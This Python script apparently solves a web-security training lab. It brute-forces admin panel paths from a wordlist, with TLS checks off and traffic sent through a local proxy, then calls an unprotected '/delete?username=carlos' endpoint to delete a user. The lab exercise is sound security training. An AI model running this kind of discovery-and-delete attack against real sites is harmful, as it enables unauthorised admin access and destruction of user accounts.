import requests
import sys
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_admin_panel(url:str, wordlist:str):
    if url.endswith('/'):
        url = url.removesuffix('/')
    try:
        with open(wordlist, 'r') as file:
            endpoints = [line.strip() for line in file if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"Wordlist {wordlist} not found")
        return None
    for endpoint in endpoints:
        admin_url = urljoin(url, endpoint)
        print(admin_url)
        try:
            r = requests.get(admin_url, verify=False, proxies=proxies, timeout=5)
            if r.status_code == 200:
                print(f"Admin Panel Found! {admin_url}")
                return admin_url
        except requests.exceptions.RequestException as ex:
            print(f"Error connecting to admin url: {admin_url}: {ex}")
            continue
    print("Couldn't find admin panel")
    return None

def delete_carlos(admin_url):
    #as seen in proxy history this is the endpoint to delete carlos:/delete?username=carlos
    try:
        r = requests.get(admin_url+'/delete?username=carlos', verify=False, proxies=proxies, timeout=5)
        if r.status_code == 302 or r.status_code == 200:
            print("Carlos Deleted\nLab Solved!!")
            return True
    except requests.exceptions.RequestException as ex:
        print(f"Error deleting Carlos: {ex}")
        return False
    print("User is not deleted!")
    return False

def main():
    if len(sys.argv) != 3:
        print(f"Script Usage: {sys.argv[0]} <url> <wordlist>")
        print(f"Example: {sys.argv[0]} example.com admin.txt")
        sys.exit(-1)
    
    url = sys.argv[1]
    wordlist = sys.argv[2]
    print("Finding admin panel")
    discovered_endpoint = find_admin_panel(url, wordlist)
    if discovered_endpoint:
        print("Deleting Carlos")
        delete_carlos(discovered_endpoint)
    else:
        sys.exit(-1)
        

if __name__ == "__main__":
    main()